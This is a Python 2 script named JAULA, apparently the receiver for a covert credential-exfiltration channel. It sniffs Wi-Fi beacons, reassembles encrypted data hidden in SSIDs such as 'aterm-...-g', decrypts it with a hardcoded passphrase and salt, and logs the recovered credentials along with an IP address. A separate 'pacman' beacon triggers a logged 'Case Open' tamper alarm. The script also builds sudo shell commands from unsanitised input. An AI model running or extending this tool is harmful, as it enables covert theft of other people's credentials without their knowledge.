#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import sys
import os
import re
import argparse
import subprocess
import collections
import time
import pyaes
import pyscrypt
from pyfiglet import Figlet
from scapy.all import Dot11, Dot11Elt, Dot11Beacon, sniff

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.5"

# Config
PHRASE = 'Waaaaa! awesome :)'
SALT = 'salgruesa'
SSIDROOT = 'aterm-c17c02'
SSIDALARM = 'pacman'
WIFICHANNEL = '10'

# Global
DEBUG = False
dic = {}
pkttotal = 0
pktlen = 0
cnt = True
sid = []


def printalarm(fd):
    text = 'ALARM Case Open!'
    with open(fd, 'a+') as sfile:
        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text + '\n')
    if DEBUG:
        print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text)
    print('Sayonara')
    os._exit(1)


def printer(fd, text):
    if DEBUG:
        print('Receive Credentails via Wireless Beacon:')
        print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text)
    find = re.compile('\\b' + text + '\\b')
    with open(fd, 'a+') as sfile:
        with open(fd, 'r') as xfile:
            m = find.findall(xfile.read())
            if not m:
                sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) +
                            text + '\n')

def decrypti(ciphertxt):
    hashed = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(ciphertxt.decode('hex'))
    return cleartxt

def hextoip(ip):
    n = 2
    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])

def parsingopt():
    f = Figlet(font='standard')
    print(f.renderText('JAULA'))
    print('Author: ' + __author__)
    print('Version: ' + __version__ + '\n')
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument('-v', '--verbose',
                        action='store_true', help='Enable debugging')
    parser.add_argument('-i', required=True,
                        metavar='<wlan1>', dest='wnic', help='wlan int')
    parser.add_argument('-f', required=True,
                        metavar='<file>', dest='fd', help='Output file')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        parser.print_help()
        sys.exit(1)

def pkt_callback(pkt):
    global pkttotal
    global pktlen
    global cnt
    global sid
    global dic
    # Look for beacon with SSIDROOT as starting SSID
    # grab crypto len & amount of SSID's with crypto on it (use -g on those)
    if pkt.haslayer(Dot11Beacon):
        if (pkt[Dot11Elt].info == SSIDALARM) and (pkt[Dot11].SC == 666):
            printalarm(fd)
        if (pkt[Dot11Elt].info == SSIDROOT) and (cnt):
            pkttotal = pkt[Dot11].SC
            pktlen = pkt[Dot11Beacon].beacon_interval
            cnt = False
        elif ('aterm' and '-g' in pkt[Dot11Elt].info):
            if pkt[Dot11Beacon].beacon_interval == pktlen:
                if str(pkt[Dot11Elt].info).split('-')[1] not in sid:
                    dic[pkt[Dot11].SC] = str(
                        pkt[Dot11Elt].info).split('-')[1]
                    sid.append(str(pkt[Dot11Elt].info).split('-')[1])
        if (len(dic) == pkttotal) and (pkttotal > 0):
            odic = collections.OrderedDict(sorted(dic.items()))
            final = ''
            for k, v in odic.iteritems():
                final = final + v
            text = decrypti(final[:pktlen])
            text = text.strip()
            hexip = text.split(',')[-1]
            text = text.replace(hexip, hextoip(hexip))
            printer(fd, text)
            dic = {}
            sid = []
            pktlen = 0
            pkttotal = 0
            cnt = True

# Main Function
def main():
    global DEBUG
    global fd

    options = parsingopt()

    fd = options.fd
    iface = options.wnic
    dic = {}
    pkttotal = 0
    pktlen = 0
    cnt = True
    sid = []

    if options.verbose:
        DEBUG = True

    if DEBUG:
        print('Listening.....')

    subprocess.call('sudo ip link set ' + iface + ' down', shell=True)
    time.sleep(0.3)
    subprocess.call('sudo iw ' + iface + ' set monitor control', shell=True)
    time.sleep(0.3)
    subprocess.call('sudo ip link set ' + iface + ' up', shell=True)
    time.sleep(0.3)
    subprocess.call('sudo iw ' + iface + ' set channel ' + WIFICHANNEL, shell=True)

    # Running loop
    try:
        while True:
            sniff(iface=iface, prn=pkt_callback, store=0)
    except KeyboardInterrupt:
        sys.exit(0)


# Call main
if __name__ == '__main__':
    main()
